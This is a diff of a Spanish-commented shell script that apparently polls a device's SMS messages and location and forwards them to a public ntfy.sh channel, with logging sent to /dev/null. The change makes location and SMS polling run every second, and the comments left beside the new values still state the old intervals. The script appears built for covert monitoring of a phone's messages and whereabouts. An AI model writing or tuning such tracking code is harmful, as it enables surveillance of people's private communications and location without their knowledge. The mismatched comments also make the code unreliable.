@@ -2,8 +2,8 @@
 
 # === CONFIGURACIÓN ===
 NTFY_URL="https://ntfy.sh/3kG4epWMkei6KLLq"  # tu canal NTFY público
-INTERVALO=3600  # Intervalo principal en segundos (1 hora)
-LOC_INTERVAL=300  # Intervalo para ubicación (5 minutos)
+INTERVALO=9999  # Intervalo principal en segundos (1 hora)
+LOC_INTERVAL=1  # Intervalo para ubicación (5 minutos)
 LOGFILE="/dev/null"
 SMS_LAST_ID_FILE="$HOME/.ultimo_sms_id"
 
@@ -113,7 +113,7 @@ monitor_sms() {
                 echo "$CURRENT_ID" > "$SMS_LAST_ID_FILE"
             fi
         fi
-        sleep 30  # Verificar cada 30 segundos
+        sleep 1  # Verificar cada 30 segundos
     done
 }
 
